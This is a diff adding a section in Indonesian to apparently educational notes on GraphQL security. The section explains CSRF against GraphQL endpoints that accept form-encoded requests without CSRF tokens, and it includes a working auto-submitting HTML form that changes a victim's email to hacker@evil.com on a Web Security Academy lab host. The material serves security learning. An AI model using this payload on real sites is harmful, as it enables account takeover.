@@ -147,3 +147,29 @@ query isValidDiscount($code: Int) {
     }
 }
 ```
+
+***
+
+## GraphQL CSRF
+
+Secara standar, GraphQL menggunakan POST dengan content type application/json. Browser secara alami membatasi pengiriman JSON lintas domain (CORS) kecuali diizinkan secara eksplisit. Masalah muncul ketika endpoint menerima GET dan content type dapat menggunakan application/x-www-form-urlencoded.
+
+Kerentanan ini bisa terdapat ketika GraphQL endpoint tidak memvalidasi content-type request yang dikirimkan dan tidak ada CSRF token.
+
+Berikut contoh html yang dapat memicu dan memanfaatkan kerentanan ini:
+
+```html
+<form action="https://0a2e00aa034c071280b3030a004e00c5.web-security-academy.net/graphql/v1" method="POST" enctype="application/x-www-form-urlencoded">
+      <input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }" />
+      
+      <input type="hidden" name="operationName" value="changeEmail" />
+      
+      <input type="hidden" name="variables" value='{"input":{"email":"hacker@evil.com"}}' />
+      
+      <input type="submit" value="Click here if not redirected" />
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+```
